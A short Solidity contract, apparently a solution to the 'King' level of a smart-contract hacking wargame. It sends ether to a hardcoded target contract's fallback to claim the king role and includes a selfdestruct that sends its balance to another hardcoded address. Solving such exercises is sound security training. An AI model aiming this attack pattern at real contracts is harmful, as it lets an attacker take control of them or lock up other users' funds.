// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level09.sol";

import "forge-std/console.sol";

contract KingAttack
{
    address payable addr = payable(0x27E8921ae399a9C77ED4149A45A30d8622f855A1);
    King public kingInstance = King(addr);

    constructor() payable {

    }

    function transfer() public 
    {
        (bool success, ) = address(kingInstance).call{value: 0.002 ether}(""); // trigger the fallback function
        console.log(success);
    }

    receive() payable external {
    }

    function selfdestruct_contract() public {
        selfdestruct(payable(0x4e6bA705D14b2237374cF3a308ec466cAb24cA6a));
    }
}